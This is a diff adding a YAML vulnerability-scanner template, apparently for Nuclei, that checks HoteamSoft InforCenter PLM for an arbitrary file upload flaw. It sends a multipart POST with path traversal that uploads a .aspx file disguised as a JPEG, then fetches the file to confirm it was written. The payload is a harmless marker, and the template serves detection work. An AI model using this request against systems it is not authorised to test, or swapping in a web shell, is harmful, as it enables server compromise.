@@ -1,0 +1,59 @@
+id: hoteamsoft-plm-uploadfiletoiis-file-upload
+info:
+  name: HoteamSoft InforCenter PLM Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    HoteamSoft InforCenter PLM is vulnerable to arbitrary file upload via the uploadFileToIIS endpoint.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+  dt: "{{date_time('%Y%m%d')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.aspx"
+    extractors:
+      - type: regex
+        name: file
+        regex:
+          - "(?P<file>[0-9a-z-]+)\\.aspx"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Files/{{dt}}/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
